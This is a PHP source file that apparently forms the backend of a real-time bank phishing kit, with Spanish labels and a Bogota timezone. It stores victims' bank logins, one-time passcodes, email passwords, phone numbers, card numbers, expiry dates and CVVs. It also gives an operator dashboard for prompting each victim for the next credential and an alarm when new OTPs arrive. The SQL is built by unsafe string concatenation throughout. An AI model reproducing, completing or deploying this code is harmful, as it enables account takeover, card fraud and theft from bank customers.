<?php
require('link.php');

function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mob,$card,$dat,$cvv){
	$labelstatus = "";
	$alertstatus = "-off";
	switch ($status) {
		case 1: $labelstatus = "Ingresó Usuario/Clave";	
				$alertstatus = "";
				$fondo = "#79B6FF";	
				$colorlabel = "#fff";
				$colorborde = "#fff";
				$activo = "";	
				$btn_on = "";
				$icon_on = "a";
				break;
		case 2: $labelstatus = "Esperando OTP";	
				$alertstatus = "-off";
				$fondo = "#fff";
				$colorlabel = "#b5b5c3";
				$colorborde = "#C0C0CC";
				$activo = "disabled";
				$btn_on = "-off";
				$icon_on = "g";
				break;
		case 3: $labelstatus = "Ingresó OTP";
				$alertstatus = "";
				$fondo = "#79B6FF";	
				$colorlabel = "#fff";
				$colorborde = "#fff";
				$activo = "";
				$btn_on = "";
				$icon_on = "a";
				break;
		case 4: $labelstatus = "Esperando Correo/Clave";	
				$alertstatus = "-off";
				$fondo = "#fff";	
				$colorlabel = "#b5b5c3";
				$colorborde = "#C0C0CC";
				$activo = "disabled";
				$btn_on = "-off";
				$icon_on = "g";
				break;
		case 5: $labelstatus = "Ingresó Correo/Clave";	
				$alertstatus = "";
				$fondo = "#79B6FF";	
				$colorlabel = "#fff";
				$colorborde = "#fff";
				$activo = "";
				$btn_on = "";
				$icon_on = "a";
				break;
		case 6: $labelstatus = "Esperando Info Tarjeta";	
				$alertstatus = "-off";
				$fondo = "#fff";	
				$colorlabel = "#b5b5c3";
				$colorborde = "#C0C0CC";
				$activo = "disabled";
				$btn_on = "-off";	
				$icon_on = "g";
				break;
		case 7: $labelstatus = "Ingresó Info Tarjeta";
				$alertstatus = "";
				$fondo = "#79B6FF";	
				$colorlabel = "#fff";
				$colorborde = "#fff";
				$activo = "";
				$btn_on = "";
				$icon_on = "a";
				break;
		case 8: $labelstatus = "Esperando Nuevo OTP";	
				$alertstatus = "-off";
				$fondo = "#fff";
				$colorlabel = "#b5b5c3";
				$colorborde = "#C0C0CC";
				$activo = "disabled";
				$btn_on = "-off";
				$icon_on = "g";
				break;
		case 9: $labelstatus = "Ingresó Nuevo OTP";	
				$alertstatus = "";
				$fondo = "#79B6FF";	
				$colorlabel = "#fff";
				$colorborde = "#fff";
				$activo = "";
				$btn_on = "";
				$icon_on = "a";
				break;
		case 10: $labelstatus = "Finalizado";	
				$alertstatus = "-off";
				$fondo = "#fff";	
				$colorlabel = "#b5b5c3";
				$colorborde = "#C0C0CC";
				$activo = "disabled";
				$btn_on = "-off";
				$icon_on = "g";
				break;
		case 12: $labelstatus = "Esperando Usuario/Clave";	
				$alertstatus = "-off";
				$fondo = "#fff";	
				$colorlabel = "#b5b5c3";
				$colorborde = "#C0C0CC";
				$activo = "disabled";
				$btn_on = "-off";
				$icon_on = "g";
				break;
		}

	echo '<div class="item-des" style="background-color: '.$fondo.';">
			<table>
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #006BE9;">Login</div></td>
					<td colspan="3"><div class="grupo" style="background-color: #50CD89;">Correo</div></td>
				</tr>
				<tr>
					<td width="220">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Usuario</span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Password</span>
						</div>
					</td>
					<td width="100">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">OTP</span>
						</div>
					</td>
			
					<td width="330">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Correo</span>
						</div>
					</td>
					<td width="150">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$cml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Clave</span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$mob.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Celular</span>
						</div>
					</td>
				</tr>
			</table>
<div style="width:100%; height: 7px;"></div>
			<table>
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #F1416C;">Tarjeta</div></td>
					<td colspan="4"><div class="grupo" style="background-color: #FFC700;">Sistema</div></td>
				</tr>
				<tr>
					<td width="200">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$card.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Tarjeta</span>
						</div>
					</td>
					<td width="100">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$dat.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Fecha</span>
						</div>
					</td>
					<td width="65">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">CVV</span>
						</div>
					</td>				
					<td width="110">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$dis.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Dispositivo</span>
						</div>
					</td>
					<td width="125">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">IP</span>
						</div>
					</td>
					<td width="130">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$ban.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Banco</span>
						</div>
					</td>
					<td width="200">
						<div class="campo" style="border: 1px dashed '.$colorborde.';">
							<span class="valor">'.$time.'</span><br>
							<span class="etiquetaVal" style=" color:'.$colorlabel.';">Hora</span>
						</div>
					</td>
				</tr>
			</table>
<div class="msg-status'.$alertstatus.'">'.$labelstatus.'</div>
			<table style="margin:0 auto;">
				<tr>
					<td>
						<button class="control'.$btn_on.' usuario" '.$activo.'  id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/usuario-'.$icon_on.'.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$btn_on.' dinamica" '.$activo.' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/otp-'.$icon_on.'.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$btn_on.' otp" '.$activo.' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/nuevo-otp-'.$icon_on.'.svg" width="16"></td>
									<td>Nuevo OTP</td>
								</tr>
							</table>
						</button>						
					</td>
					<td>
						<button class="control'.$btn_on.' correo" '.$activo.' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/correo-'.$icon_on.'.svg" width="16"></td>
									<td>Correo</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$btn_on.' tarjeta" '.$activo.' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/tarjeta-'.$icon_on.'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar" '.$activo.'  id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/finalizar-a.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>
		</div>';
}

function get_items(){
	if ($con = conectar()) {
		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status <> 0 ORDER BY horamodificado DESC");
		if (contarfilas($consulta)) {
			while ($datos=traerdatos($consulta)) {				
				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv']);								
			}
		}else{

		}
		desconectar($con);
	}else{

	}
}

function sound_alarm(){
	if ($con = conectar()) {
		$consulta1 = sentencia($con,"SELECT * FROM m3it3m WHERE status = 3 OR status = 9");
		if (contarfilas($consulta1)) {
			echo "OTP";
		}else{
			$consulta2 = sentencia($con,"SELECT * FROM m3it3m WHERE status = 1 OR status = 5 OR status = 7");
			if (contarfilas($consulta2)) {
				echo "SI";
			}else{
				echo "NO";
			}
		}	
		desconectar($con);
	}else{

	}
}

function upgrades_status($id,$est){
	if ($con = conectar()) {
		if (sentencia($con,"UPDATE m3it3m SET status = '".$est."' WHERE idreg = ".$id)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}

function create_item($usr,$pass,$dis){
	date_default_timezone_set('America/Bogota');
	$ip_add = $_SERVER['REMOTE_ADDR'];
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		if (sentencia($con,"INSERT INTO m3it3m (idreg, usuario,
		password, otp, dispositivo, ip, id, agente, banco, 
		status, horacreado, horamodificado) 
		VALUES (NULL, '".$usr."', '".$pass."', NULL, '".$dis."', 
		'".$ip_add."', NULL, NULL, 'JUNIOR', '1', '".$hoy."', '".$hoy."')")) {
			$consulta = sentencia($con,"SELECT idreg FROM m3it3m WHERE usuario = 
			'".$usr."'
			ORDER BY idreg DESC LIMIT 1");
			if (contarfilas($consulta)) {
				$datos=traerdatos($consulta);
				setcookie('id',$datos["idreg"],time()+60*9);			
				echo $datos["idreg"];
			}			
		}else{
			echo "NO";
		}
		desconectar($con);
	}else{
		echo "ERR";
	}
}

function status($r){
	if ($con = conectar()) {
		$consulta = sentencia($con,"SELECT status FROM m3it3m WHERE idreg = '".$r."'");
		if (contarfilas($consulta)) {
			$datos=traerdatos($consulta);
			return $datos["status"];
		}else{

		}
		desconectar($con);
	}else{

	}
}

function put_otp($id,$cd){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		sentencia($con,"UPDATE m3it3m SET status = '3', otp ='".$cd."', horamodificado='".$hoy."' WHERE idreg = ".$id);
		desconectar($con);
	}
}

function put_mail($id,$mail,$cm,$cel){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		sentencia($con,"UPDATE m3it3m SET status = '5', email='".$mail."', cemail='".$cm."', celular='".$cel."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
		desconectar($con);
	}
}

function put_card($id,$tar,$ft,$cvv){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {	
		sentencia($con,"UPDATE m3it3m SET status = '7', tarjeta='".$tar."', ftarjeta='".$ft."', cvv='".$cvv."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
		desconectar($con);
	}
}


?>